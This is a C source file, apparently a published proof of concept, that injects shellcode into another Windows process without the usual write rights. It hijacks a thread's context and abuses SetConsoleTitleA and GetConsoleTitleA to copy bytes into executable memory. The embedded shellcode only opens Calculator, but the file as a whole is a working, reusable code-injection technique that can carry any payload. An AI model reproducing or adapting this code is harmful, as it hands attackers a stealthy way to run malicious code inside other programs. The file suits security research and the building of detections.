/**
    * @author   x0reaxeax
    * @brief    Writing remote process memory without any handles / access rights
    *
    * @license  This project is licensed under the MIT license. Copyrights are respective of each contributor listed at the beginning of each definition file.
    *
    * @note     See 'README.md' for more information.
    *           Also, no cleanup on error, plz no throwing potatoes @ me
    *
    *
    * @credits  https://github.com/boku7 - for the PopCalc shellcode
    *
    * https://github.com/x0reaxeax
*/

#include <Windows.h>
#include <stdio.h>

#pragma warning (disable : 4996)

#ifdef _DEBUG
#define GET_ADDR_BYTES(addr)		\
    (BYTE) (addr & 0xFF),			\
    (BYTE) ((addr >> 8) & 0xFF),	\
    (BYTE) ((addr >> 16) & 0xFF),	\
    (BYTE) ((addr >> 24) & 0xFF),	\
    (BYTE) ((addr >> 32) & 0xFF),	\
    (BYTE) ((addr >> 40) & 0xFF),	\
    (BYTE) ((addr >> 48) & 0xFF),	\
    (BYTE) ((addr >> 56) & 0xFF)
#endif

#define PrintError(msg)								\
    printf("[-] %s - E%lu\n", msg, GetLastError());	\
    return EXIT_FAILURE

/* PopCalc shellcode source: https://www.exploit-db.com/shellcodes/49819 */
CONST BYTE abPayload[] = {
    0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48,
    0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48,
    0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b,
    0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8,
    0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31,
    0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1,
    0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2,
    0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d,
    0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a,
    0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44,
    0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32,
    0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2,
    0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff,
    0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48,
    0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
    0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04,
    0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0,
    0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07,
    0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87,
    0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8,
    0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff,
    0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7,
    0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c,
    0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50,
    0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83,
    0xec, 0x20, 0x41, 0xff, 0xd6, 0x90, 0x90, 0x00
};

/**
* @brief
*  Write memory via SetConsoleTitleA
*/
DWORD WriteMem(
    HANDLE hThread,
    LPVOID lpRip,
    LPVOID lpRetAddress,
    LPVOID lpDestAddr,
    CONST LPBYTE lpSrcBuf,
    SIZE_T cbBufSiz
) {
    if ((DWORD) -1 == SuspendThread(hThread)) {
        PrintError("SuspendThread");
        return EXIT_FAILURE;
    }

    CONTEXT ctx = {
        .ContextFlags = CONTEXT_ALL
    };

    if (!GetThreadContext(hThread, &ctx)) {
        PrintError("GetThreadContext");
        return EXIT_FAILURE;
    }

    ctx.Rsp = (DWORD64) lpRetAddress;
    ctx.Rip = (DWORD64) lpRip;
    ctx.Rcx = (DWORD64) lpDestAddr;
    ctx.Rdx = (DWORD64) cbBufSiz;

    printf(
        "[ --=== NEW CONTEXT ===-- ]\n"
        " * RSP: 0x%02llx\n"
        " * RIP: 0x%02llx\n"
        " * RCX: 0x%02llx\n"
        " * RDX: 0x%02llx\n",
        ctx.Rsp,
        ctx.Rip,
        ctx.Rcx,
        ctx.Rdx
    );

    if (!SetThreadContext(hThread, &ctx)) {
        PrintError("SetThreadContext");
        return EXIT_FAILURE;
    }

    if (!SetConsoleTitleA(lpSrcBuf)) {
        PrintError("SetConsoleTitleA");
        return EXIT_FAILURE;
    }

    if ((DWORD) -1 == ResumeThread(hThread)) {
        PrintError("ResumeThread()");
        return EXIT_FAILURE;
    }

    // enough time to finish work, before we get in the way again..
    Sleep(250);

    return EXIT_SUCCESS;
}

int main(int argc, const char *argv[]) {
    if (argc < 3) {
        printf("%s <pid> <tid> [loopaddr]\n", argv[0]);
        return EXIT_FAILURE;
    }

    ULONG_PTR lpJmpLoopAddr = 0;

    if (4 == argc) {
        lpJmpLoopAddr = strtoull(argv[3], NULL, 16);
    } else {
        BYTE szInput[24] = { 0 };
        printf("[*] Loop Addr: ");

        fgets(szInput, sizeof(szInput), stdin);
        lpJmpLoopAddr = (ULONG_PTR) strtoull(szInput, NULL, 16);
    }

    if (0 == lpJmpLoopAddr) {
        return EXIT_FAILURE;
    }

    DWORD dwPid = strtoul(argv[1], NULL, 10);
    DWORD dwTid = strtoul(argv[2], NULL, 10);

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION,
        FALSE,
        dwPid
    );

    if (NULL == hProcess) {
        fprintf(
            stderr,
            "[-] OpenProcess() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    CONST SIZE_T cbAlloc = (1 << 20); // 1MB
    LPVOID lpMem = VirtualAllocEx(
        hProcess,
        NULL,
        cbAlloc,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (NULL == lpMem) {
        fprintf(
            stderr,
            "[-] VirtualAllocEx() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    /* we don't need some puny mortal handle to WPM.. */
    CloseHandle(hProcess);

    printf("[+] 0x%llx RWX bytes @ 0x%02llx\n", cbAlloc, (ULONG_PTR) lpMem);

    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        FALSE,
        dwTid
    );

    if (NULL == hThread) {
        fprintf(
            stderr,
            "[-] OpenThread() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");

    if (NULL == hKernelBase) {
        fprintf(
            stderr,
            "[-] GetModuleHandleA() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    LPVOID lpGetConsoleTitleA = GetProcAddress(hKernelBase, "GetConsoleTitleA");

    if (NULL == lpGetConsoleTitleA) {
        fprintf(
            stderr,
            "[-] GetProcAddress() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    printf("[+] GetConsoleTitleA() @ 0x%02llx\n", (ULONG_PTR) lpGetConsoleTitleA);

    printf("[*] Detaching console..\n");

    if (!FreeConsole()) {
        fprintf(
            stderr,
            "[-] FreeConsole() - E%lu\n",
            GetLastError()
        );
        return EXIT_FAILURE;
    }

    if (!AttachConsole(dwPid)) {
        return EXIT_FAILURE;
    }

    ULONG_PTR lpPayloadAddr = ((ULONG_PTR) lpMem + 0x7020);

    FILE *fpStdout = freopen("CONOUT$", "w", stdout);

    /* Write `jmp $` loop to bounce back to after each API call */
    if (EXIT_SUCCESS != WriteMem(
        hThread,
        lpGetConsoleTitleA,							/* RIP	*/
        (LPVOID) ((ULONG_PTR) lpMem + 0x7000),		/* RSP (RET  => jmpLoop) */
        (LPVOID) ((ULONG_PTR) lpMem + 0x7000),		/* RCX (DEST == jmpLoop) */
        (LPBYTE) &lpJmpLoopAddr,					/* SRC (jump loop address bytes) */
        sizeof(ULONG_PTR)							/* SIZE */
    )) {
        return EXIT_FAILURE;
    }

    /* Write payload pointer */
    if (EXIT_SUCCESS != WriteMem(
        hThread,
        lpGetConsoleTitleA,							/* RIP */
        (LPVOID) ((ULONG_PTR) lpMem + 0x7000),		/* RSP (RET  => jmpLoop) */
        (LPVOID) ((ULONG_PTR) lpMem + 0x7010),		/* RCX (DEST == payload pointer) */
        (LPBYTE) &lpPayloadAddr,					/* SRC (payload address bytes) */
        sizeof(ULONG_PTR)						    /* SIZE */
    )) {
        return EXIT_FAILURE;
    }

    /* Write actual payload */
    if (EXIT_SUCCESS != WriteMem(
        hThread,
        lpGetConsoleTitleA,							/* RIP */
        (LPVOID) ((ULONG_PTR) lpMem + 0x7010),		/* RSP (RET  => payload pointer) */
        (LPVOID) ((ULONG_PTR) lpMem + 0x7020),		/* RCX (DEST == payload) */
        (CONST LPBYTE) abPayload,					/* SRC (actual payload) */
        sizeof(abPayload)							/* SIZE */
    )) {
        return EXIT_FAILURE;
    }

    printf("\n[+] Get calc'd ;)\n");

    return EXIT_SUCCESS;
}